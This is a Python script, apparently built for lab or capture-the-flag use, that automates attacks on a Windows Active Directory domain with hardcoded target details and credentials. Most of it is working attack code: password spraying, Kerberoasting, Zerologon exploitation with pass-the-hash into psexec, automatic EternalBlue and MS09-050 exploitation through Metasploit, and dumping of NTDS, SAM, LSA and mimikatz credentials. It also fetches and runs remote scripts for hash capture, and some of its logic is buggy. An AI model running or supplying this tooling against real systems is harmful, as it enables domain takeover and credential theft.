#!/usr/bin/env python3 

import os
import argparse
import sys
import time
import os.path
import subprocess
import shutil
from subprocess import call
import urllib.request
from os import system

lhost = "10.10.0.16" #Your LHOST IP
lport = "80" #Your web port (ex: 8080)
inter = "tun0" #Your interface (ex: tun0 or eth0)
domainip = "172.31.3.8" #Domain IP you are attacking if you do not know do a crackmapexec smb <rhost ip> -u fjdkasf -p /usr/share/wordlists/rockyou.txt and it will show you the domain name
domain = "toast" #Domain name
username = "karen" #if you have a username for the domain you are attacking insert here
userfile = "" #if you have a user file put here
password = "MANAGER" #if you have a password that goes along with the username put here
passfile = "" #if you have a password file put here

parser = argparse.ArgumentParser(description="Enum AD",
formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-D", "--Download", action="store_true", help="Download tools")
parser.add_argument("-s", "--scan", action="store_true", help="Scan Domain for open ports")
parser.add_argument("-B", "--BloodHound", action="store_true", help="Run bloodhound-python")
parser.add_argument("-C", "--Crackmapexec", action="store_true", help="Will try a bunch of things with crackmapexec")
parser.add_argument("-S", "--SMBKiller", action="store_true", help="Run SMB_Killer Script by OvergrownCarrot1 to hopefully get NetNTLMv2 Hashes from share")
parser.add_argument("-Z", "--Zero", action="store_true", help="Zero Logon Attack")
parser.add_argument("-E", "--Eternal", action="store_true", help="Test for EternalBlue and automatically exploit")
parser.add_argument("-9", "--MS09050", action="store_true", help="Test for MS09-050 and automatically exploit")
parser.add_argument("-M", "--Mimikatz", action="store_true", help="Will run mimikatz with crackmapexec, note takes a long time to run")
parser.add_argument("-e", "--enum4linux", action="store_true", help="Will run enum4linux")
parser.add_argument("-c", "--crack", action="store_true", help="Crack hashes with john the ripper")
args = parser.parse_args()

def scan():
	ret_code = system("ls "+domainip+"-rustscan.txt")
	if ret_code == 0:
		print("\033[1;33m Rustscan exists not running\033[1;39m")
	else:
		scan = input('Rustscan or NMAP (r/n): \n')
		if scan == "r":
			ret_code = system("ls "+domainip+"-rustscan.txt")
			if ret_code != 0:
				print("\033[1;31m Saving everything to "+domainip+"-rustscan.txt\033[1;39m")
				r = open(domainip+'-rustscan.txt','wt')
				system("rustscan --ulimit 5000 -a "+domainip+" -- -Pn > "+domainip+"-rustscan.txt")
				re = open(domainip+"-rustscan.txt", "r")
				with open(domainip+'-rustscan.txt') as re:
					print("\033[1;31m File "+domainip+"-rustscan.txt already exists, not running rustscan again\033[1;39m")
					contents = re.read()
					print(contents)
			else:
				with open(domainip+'-rustscan.txt') as re:
					print("\033[1;31m File "+domainip+"-rustscan.txt already exists, not running rustscan again\033[1;39m")
					contents = re.read()
					print(contents)
		elif scan == "n":
			ret_code = system("ls "+domainip+"-rustscan.txt")
			if ret_code != 0:
				print("\033[1;31m Saving everything to "+domainip+"-rustscan.txt\033[1;39m")
				r = open(domainip+'-rustscan.txt','wt')
				system("nmap -p- -vv -Pn -T4 -n "+domainip+ ">"+domainip+"-rustscan.txt")
				re = open(domainip+"-rustscan.txt", "r")
				with open(domainip+'-rustscan.txt') as re:
					print("\033[1;31m File "+domainip+"-rustscan.txt already exists, not running rustscan again\033[1;39m")
					contents = re.read()
					print(contents)
			else:
				with open(domainip+'-rustscan.txt') as re:
					print("\033[1;31m File "+domainip+"-rustscan.txt already exists, not running rustscan again\033[1;39m")
					contents = re.read()
					print(contents)

a = "exists, not downloading" #used for downloads do not delete
b = "does not exist, downloading" #used for downloads do not delete

def rust():
	ret_code = system("which rustscan")
	url = "https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb"
	if ret_code != 0:
	    print("\033[1;31m Rustscan "+b) # red font
	    system("""wget -c --read-timeout=5 --tries=0 """+url)
	    system("""sudo dpkg -i rustscan_2.0.1_amd64.deb""")
	else:
		print("\033[1;32m Rustscan "+a) #green font
		print("\033[1;39m ") #white font

def blood():
	ret_code = system("which bloodhound-python")
	if ret_code != 0:
		print("\033[1;31m bloodhound-python "+b)
		subprocess.check_call([sys.executable, '-m', 'pip3', 'install', 'bloodhound-python'])
	else:
		print("\033[1;32m bloodhound-python "+a)
		print("\033[1;39m ")

def enum():
	ret_code = system("which enum4linux")
	if ret_code != 0:
		print("\033[1;31m enum4linux "+b)
		system("""sudo apt install enum4linux""")
	else:
		print("\033[1;32m enum4linux "+a)
		print("\033[1;39m ")

def terminator():
	ret_code = system("which terminator")
	if ret_code != 0:
		print("\033[1;31m terminator "+b)
		system("""sudo apt install terminator""")
	else:
		print("\033[1;32m terminator "+a)
		print("\033[1;39m ")

def crackmapexec():
	ret_code = system("which crackmapexec")
	if ret_code != 0:
		print("\033[1;31m crackmapexec "+b)
		system("""sudo apt install crackmapexec""")
	else:
		print("\033[1;32m crackmapexec "+a)
		print("\033[1;39m ")

def ldapdomaindump():
	ret_code = system("which ldapdomaindump")
	if ret_code != 0:
		print("\033[1;31m ldapdomaindump "+b)
		system("""sudo apt install ldapdomaindump""")
	else:
		print("\033[1;32m ldapdomaindump "+a)
		print("\033[1;39m ")

def impacket():
	ret_code = system("which impacket-smbserver")
	if ret_code != 0:
		print("\033[1;31m impacket "+b)
		subprocess.check_call([sys.executable, '-m', 'pip3', 'install', 'impacket'])
	else:
		print("\033[1;32m impacket "+a)
		print("\033[1;39m ")

def kerbrute():
	ret_code = system("locate kerbrute_linux_amd64")
	if ret_code != 0:
		print("\033[1;31m kerbrute_linux_amd64 "+b)
		system("wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64")
		system("wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_386")
	else:
		print("\033[1;32m kerbrute_linux_amd64 "+a+ "\033[1;39m""")
def neo4j():
	ret_code = system("which neo4j")
	if ret_code !=0:
		print("\033[1;31m neo4j "+b)
		print("\033[1;39m")
		system("sudo apt install neo4j")
	else:
		print("\033[1;32m neo4j "+a+ "\033[1;39m""")

def bloodhound():
	print("\033[1;31m If running bloodhound run with sudo\033[1;39m\n")
	if (len(username) == 0 ) and (len(password) == 0) and (len(domain) == 0):
		print("\033[1;31m Need to specify username, password and domain\033[1;39m")
	if (len(username) != 0 ) and (len(password) != 0) and (len(domain) != 0):
		ret_code = system("which neo4j")
		if ret_code !=0:
			print("\033[1;31m neo4j "+b)
			print("\033[1;39m")
			system("sudo apt install neo4j")
		else:
			print("\033[1;32m neo4j "+a+ "\033[1;39m""")
	system("bloodhound-python -u "+username+" -p "+password+" -ns "+domainip+" -d "+domain+" -c all")
	subprocess.call(['xterm', '-e', 'sudo neo4j console'])
	subprocess.call(['xterm', '-e', 'bloodhound'])
	print("\033[1;31m Running neo4j console in background and sleeping for 7 seconds to allow it to start\033[1;39m\n")
	system("nohup sudo neo4j console") 
	time.sleep(7)
	subprocess.call(['xterm', '-e', 'bloodhound'])
	
def smbkiller():
	print("\033[1;31m Downloading newest version of smbkiller from github\033[1;39m")
	url = "https://raw.githubusercontent.com/overgrowncarrot1/Invoke-Everything/main/SMB_Killer.py"
	input("\033[1;32m File is downloaded, opening with nano, change the information on the top that is needed to be changed. Press enter to continue.\033[1;39m")
	file = "SMB_Killer.py"
	urllib.request.urlretrieve(url, file)
	system("nano SMB_Killer.py")
	ftype = input("\033[1;31m What file would you like to make, url, scf or xml? (ex: url)\033[1;39m\n")
	if ftype == "url":
		system("python3 SMB_Killer.py -u")
	elif ftype == "scf":
		system("python3 SMB_Killer.py -s")
	elif ftype == "xml":
		system("python3 SMB_Killer.py -x")
	else:
		print("Not an option")

def eternal():
	system("nmap -p 445 --script=smb-vuln-* -Pn -T4 "+domainip+ " > eternal.txt")
	search_word = "CVE:CVE-2017-0143"
	if search_word in open("eternal.txt").read():
		print("\033[1;31m Most likely vulnerable to EternalBlue, exploiting with Metasploit\033[1;39m")
		system("msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set LHOST "+lhost+" ;set RHOSTS " +domainip+" ; set LPORT 445 ; exploit'")
	else:
		print("\033[1;32m Not vulnerable\033[1;39m")

def MS09050():
	ret_code = system("ls eternal.txt")
	if ret_code != 0:
		print("\033[1;32m Running NMAP Vuln scan on port 445\033[1;39m\n")
		system("nmap -p 445 --script=smb-vuln-* -Pn -T4 "+domainip+ " > eternal.txt")
	search_word = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103"
	if search_word in open("eternal.txt").read():
		print("\033[1;31m Most likely vulnerable to MS09-050, exploiting with Metasploit\033[1;39m")
		system("msfconsole -x 'use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; set LHOST "+lhost+" ;set RHOSTS " +domainip+" ; set LPORT 445 ; exploit'")
	else:
		print("\033[1;32m Not vulnerable\033[1;39m")

def enum4linux():
	ret_code = system("which enum4linux")
	if ret_code != 0:
		system("enum4linux "+domainip+"")
	else:
		print("\033[1;31m Downloading enum4linux\033[1;39m")
		system("sudo apt install enum4linux -y")
		system("enum4linux "+domainip+"")

def crack():
	file = input("\033[1;31m File where hashes are stored that need to be cracked?")
	print("\033[1;31m Wordlist is rockyou.txt and trying to crack hashes\033[1;39m")
	system("john "+file+" --wordlist=/usr/share/wordlists/rockyou.txt") #change wordlist if needed here

def zero():
	print("\033[1;31m Need to put Domain Name in /etc/hosts")
	input("\033[1;32m Press enter when finished:\033[1;39m")
	ret_code = system("ls zero-dc_zerologon_dump")
	if ret_code == 0:
		print("\033[1;31m Zero logon was already ran, deleting directory and re-running\033[1;39m")
		rmdir("zero-dc_zerologon_dump")
	ret_code = system("ls zerologon.py")
	if ret_code != 0:
		print("\033[1;31m zerologon.py is not installed, installing\033[1;39m")
		system("wget https://raw.githubusercontent.com/sho-luv/zerologon/master/zerologon.py")
		zerolog = "zerologon.py -exploit "+domainip
		zerolog
	system("which impacket-psexec")
	if ret_code != 0:
		system("sudo apt install impacket-scripts -y")
	else:
		print("\033[1;31m Impacket-Scripts installed not installing\033[1;39m")
	share = input("\033[1;31m Computer name (ex: ZERO-DC)\033[1;39m \n")
	zerolog = system("python3 zerologon.py -exploit "+domainip)
	system("cat zero-dc_zerologon_dump/zero-dc.ntds")
	hashes = input("\033[1;31mCopy the NTLM hash for the administrator and paste below (ex: aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990)\n\033[1;39m")
	system("impacket-psexec -hashes "+hashes+" administrator@"+domainip)

def crackmapexec():
	if (len(username) == 0) and (len(password) == 0):
		print("\033[1;31m Need username and password or file path for both\033[1;39m")
	hashes = input("\033[1;32m Any hash you want to test can copy and paste below. Will need to be the NTLM hash, if no press enter\n\033[1;39m")
	subnet = input("\033[1;32m Put in a subnet if you want to try and login to the entire subnet (ex: 172.0.0.0/24)\n\033[1;39m")
	c = "crackmapexec"
	s = "smb"
	if (len(username) != 0) and (len(password) != 0):
		print("\033[1;31m Testing Login\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+"")
		print("\033[1;31m Seeing if winrm exists\033[1;39m")
		system(c+" winrm "+domainip+"")
		print("\033[1;31m Testing shares access\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --shares")
		print("\033[1;31m Find other users\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --users")		
		print("\033[1;31m Checking for logged on users\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --loggedon-users")
		print("\033[1;31m Enumerating Groups on target machine\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --groups")		
		print("\033[1;31m Finding txt files, bak, bac, zip and pdfs. This will take a minute\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern txt")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern zip")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern bak")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern pdf")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern bac")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern 7zip")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern doc")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern docx")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern log")
		print("\033[1;31m Finding active sessions\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --sessions")
		print("\033[1;31m Finding other drives\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --disks")	
		print("\033[1;31m Trying to dump drsuapi, this may take a minute\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --ntds drsuapi")
		print("\033[1;31m Trying to dump vss, this may take a minute\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --ntds vss")
		print("\033[1;31m Trying to dump LSA, this may take a minute\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --lsa")
		print("\033[1;31m Trying to dump SAM\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --sam")
		print("\033[1;31m Trying to enable wdigest\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" -M wdigest -o ACTION=enable")
	if subnet and (len(password) != 0) and (len(username) != 0):
		print("\033[1;31m Trying to login to entire subnet\033[1;39m")
		system(c+" "+s+" "+subnet+" -u "+username+" -p "+password+" --local-auth")
	if subnet and hashes and (len(username) != 0):
		print("\033[1;31m Trying to login to entire subnet with hash\033[1;39m")
		system(c+" "+s+" "+subnet+" -u "+username+" -H "+hashes+" --local-auth")
	if hashes and (len(username) != 0):
		print("\033[1;31m Trying to dump LSA, this may take a minute\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --lsa")
		print("\033[1;31m Trying to dump SAM\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --sam")

def mimikatz():
	if (len(username) != 0) and (len(password) != 0):
		c = "crackmapexec"
		s = "smb"
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" -M mimikatz -o COMMAND=""lsadump::lsa /patch""")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" -M mimikatz -o COMMAND=""vault::cred""")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" -M mimikatz -o COMMAND=""sekurlsa::logonpasswords full""")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" -M mimikatz -o COMMAND=""lsadump::secrets""")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" -M mimikatz -o COMMAND=""lsadump::sam""")
		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" -M mimikatz -o COMMAND=""vault::cred /patch""")

if (len(domain) == 0):
	print("\033[1;31m Below you will see the domain name, please update in EnumAD.py\033[1;39m")
	system("crackmapexec smb "+domainip+" -u fdsfaj -p fjdksaf")
	quit()

scan()
search_word = "88"
if search_word in open(domainip+"-rustscan.txt").read():
	if (len(username) == 0) and (len(password) == 0 ):
		ret_code=system("ls LDAP")
		if ret_code != 0:
			shutil.rmtree("LDAP")
			system("mkdir LDAP")
		system("ldapdomaindump "+domainip+"")
		system("mv domain* LDAP/")
		print("\033[1;31m Tried anonymous ldapdomaindump and put in LDAP folder\033[1;39m\n")
	if (len(username) != 0) and (len(password) == 0):
		userin = input("Is that a username or userfile? (u/uf):\n")
		if userin == "u":
			system("crackmapexec smb "+domainip+" -u "+username+" -p /usr/share/wordlists/rockyou.txt")
		if userin == "uf":
			system("locate kerbrute_linux_amd64")
			ker = input("Full file path to kerbrute?")
			threads = input("How many threads would you like to run, higher is faster?")
			system(ker+" userenum -d "+domain+" --dc "+domainip+" "+username+" -t "+threads+"")
			system("GetNPUsers.py "+domainip+"/ -no-pass -usersfile "+userin+" -dc-ip "+domainip+"")
	if (len(username) != 0 ) and (len(password) != 0 ):
		print("\033[1;31m Making directory LDAP and doing LDAP domain dump\033[1;39m\n")
		sys = ""+domain+"/"+username+":"+password+" -dc-ip "+domainip+""
		print("ldapdomaindump trying on "+domainip+" in domain "+domain+" with user "+username+" and password "+password+"")
		shutil.rmtree("LDAP")
		system("mkdir LDAP")
		print("\033[1;31m Tried ldapdomaindump and put in LDAP folder\033[1;39m\n")
		system("ldapdomaindump "+domainip+" -u "'"'+domain+'\\'+username+'"'" -p "+password+"")
		system("mv domain* LDAP/")
		print("")
		print("\033[1;35m Opening firefox for ldapdomaindump, make sure to look at all pages\033[1;39m\n")
		system("firefox LDAP/*.html")
		print("\033[1;31m Testing GetADUsers.py\033[1;39m\n")
		system("GetADUsers.py " +domain+"/"+username+":"+password+" -dc-ip "+domainip+"")
		print("\033[1;32m Testing GetUsersSPNs.py\033[1;39m\n")
		system("GetUserSPNs.py "+sys+"")
		time.sleep(2)
	if (len(userfile) != 0):
		system("locate kerbrute_linux_amd64")
		ker = input("Full file path to kerbrute?")
		threads = input("How many threads would you like to run, higher is faster?")
		system(ker+" userenum -d "+domain+" --dc "+domainip+" "+username+" -t "+threads+"")
		system("GetNPUsers.py "+domainip+"/ -no-pass -usersfile "+userin+" -dc-ip "+domainip+"")
print("\033[1;31m Trying LDAPSEARCH incase ldapdomaindump didn't work\033[1;39m\n")
if (len(username) == 0) and (len(password) == 0 ):
	print("\033[1;31m Trying LDAPSEARCH with no username or password\033[1;39m\n")
	DC = input("\033[1;32m DC, for this we just need the first part, (ex: if DC is cyber.local then it would be cyber) \033[1;39m\n")
	loc = input("\033[1;33m DC, for this we just need the second part of the FQDN (ex: local no period) \033[1;39m\n")
	print("\033[1;31m Putting ldapsearch results into ldap.txt\033[1;39m\n")
	system("ldapsearch -H ldap://"+domainip+" -x -b DC="+DC+",DC="+loc+' "(objectclass=person)" > ldap.txt')
	print("\033[1;31m Looking in ldap.txt for description and samaccountname\033[1;39m\n")
	system("cat ldap.txt | grep -i description")
	system("cat ldap.txt | grep -i samaccountname")
if (len(username) != 0 ) and (len(password) != 0 ):
	print("\033[1;31m Trying LDAPSEARCH\033[1;39m\n")
	DC = input("\033[1;32m DC, for this we just need the first part, (ex: if DC is cyber.local then it would be cyber) \033[1;39m\n")
	loc = input("\033[1;33m DC, for this we just need the second part of the FQDN (ex: local no period) \033[1;39m\n")
	print("\033[1;31m Putting ldapsearch results into ldap.txt\033[1;39m\n")
	system("ldapsearch -H ldap://"+domainip+" -x -b DC="+DC+",DC="+loc+' "(objectclass=person)" -D '+username+' -w '+password+' > ldap.txt')
	print("\033[1;31m Looking in ldap.txt for description and samaccountname\033[1;39m\n")
	system("cat ldap.txt | grep -i description")
	system("cat ldap.txt | grep -i samaccountname")

print("\033[1;31m Testing anonymous login on SMB Client\033[1;39m\n")
system("smbclient -L \\\\"+domainip+"\\")
if (len(username) != 0) and (len(password) !=0):
	print("\033[1;35m Testing login with "+username+" and "+password+"\033[1;39m\n")
	system("smbclient -L \\\\\\\\"+domainip+"\\\\ -U "+domain+"/"+username+"%"+password+"")
	share = input("\033[1;31m Any shares you would like to look at (ex: usershare) if no press enter to continue?\033[1;39m\n")
	if share != 0:
		system("mkdir tmp")
		print("\033[1;31m Mounting SMB Share into tmp folder\033[1;39m\n")
		system("sudo mount -t cifs //"+domainip+"/"+share+" -o user="+username+" tmp")
		smbkiller = input("\033[1;35m Do you want to download SMB_Killer.py and try to get NetNTLMv2 hash? (y/n)\033[1;39m\n")
		if smbkiller == "y":
			print("\033[1;31m Downloading newest version of smbkiller from github\033[1;39m")
			url = "https://raw.githubusercontent.com/overgrowncarrot1/Invoke-Everything/main/SMB_Killer.py"
			input("\033[1;32m File is downloaded, opening with nano, change the information on the top that is needed to be changed. Press enter to continue.\033[1;39m")
			file = "SMB_Killer.py"
			urllib.request.urlretrieve(url, file)
			system("nano SMB_Killer.py")
			ftype = input("\033[1;31m What file would you like to make, url, scf or xml? (ex: url)\033[1;39m\n")
			if ftype == "url":
				system("python3 SMB_Killer.py -u")
			elif ftype == "scf":
				system("python3 SMB_Killer.py -s")
			elif ftype == "xml":
				system("python3 SMB_Killer.py -x")
			else:
				print("Not an option")
		else:
			"Not running smbkiller"

if args.scan == True:
	scan()
if args.SMBKiller == True:
	smbkiller()
if args.Download == True:
	rust()
	blood()
	enum()
	terminator()
	crackmapexec()
	ldapdomaindump()
	impacket()
	kerbrute()
	neo4j()
if args.Zero == True:
	zero()
if args.Crackmapexec == True:
	crackmapexec()
if args.Mimikatz == True:
	mimikatz()
if args.Eternal == True:
	eternal()
if args.MS09050 == True:
	MS09050()
if args.BloodHound == True:
	bloodhound()
if args.crack == True:
	crack()
if args.enum4linux == True:
	enum4linux()
